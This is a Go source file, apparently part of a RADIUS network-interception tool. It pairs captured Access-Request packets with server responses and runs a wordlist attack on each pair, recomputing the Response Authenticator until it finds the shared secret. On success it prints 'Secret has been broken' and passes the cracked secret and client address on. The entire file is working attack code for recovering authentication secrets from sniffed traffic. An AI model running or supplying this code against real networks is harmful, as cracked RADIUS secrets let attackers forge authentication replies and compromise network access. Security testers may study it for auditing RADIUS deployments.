package session

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"radius/radius"
)

type packetInfo struct {
	packet *radius.RadiusPacket
	addr   net.UDPAddr
}

var cachedPackets []packetInfo

func GuessSecret(packet *radius.RadiusPacket, client net.UDPAddr, server net.UDPAddr, clientToServer bool, secretChan chan secretClientPair) {

	//TODO check if secret available in database before launching a goroutine

	switch packet.GetCode() {
	case radius.AccessRequest:
		if clientToServer { //Verify that the packet does not come from the RADIUS server

			for _, packetInfo := range cachedPackets {
				if packetInfo.addr.IP.Equal(client.IP) && packetInfo.addr.Port == client.Port {
					return //If client already treated, do not add it to the slice
				}

			}

			packetInfo := packetInfo{
				packet: packet,
				addr:   client,
			}

			fmt.Println("Request packet. Auth message:", packet.GetAuthenticator())

			cachedPackets = append(cachedPackets, packetInfo)
		}

	case radius.AccessAccept, radius.AccessChallenge, radius.AccessReject:

		if clientToServer || cachedPackets == nil {
			return //Something went wrong
		}

		for _, packetInfo := range cachedPackets {
			if packetInfo.packet.GetCode() == radius.AccessRequest && packetInfo.packet.GetId() == packet.GetId() &&
				packetInfo.addr.IP.Equal(client.IP) && packetInfo.addr.Port == client.Port { //Match request-response

				fmt.Println("Found request-response pair for secret brute force")

				request := packetInfo.packet

				//At this point, we have pair of packets request-response

				config := GetConfig()
				go trySecrets(request, packet, config.GetSecretsFile(), client, secretChan)

				break
			}
		}

	}

}

func trySecrets(request *radius.RadiusPacket, response *radius.RadiusPacket, secretFile string, client net.UDPAddr, secretChan chan secretClientPair) {

	file, err := os.Open(secretFile)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer file.Close()

	defer fmt.Println("Secret scanner finished for client ", client)

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {

		secret := scanner.Text()

		fmt.Println("Trying secret", secret)

		fmt.Println("Response packet. Request Auth message:", request.GetAuthenticator())
		success, respAuth := radius.CalculateResponseAuth(response, request.GetAuthenticator(), secret)

		if success {
			fmt.Println("Real response auth ", response.GetAuthenticator(), "guessed response auth", respAuth)

			if response.GetAuthenticator() == respAuth {
				fmt.Println("Match!! Secret has been broken!!!", "Secret is ", secret)

				secretClient := secretClientPair{
					clientAddr: client,
					secret:     secret,
				}

				secretChan <- secretClient
				return

			}
		}

	}

}
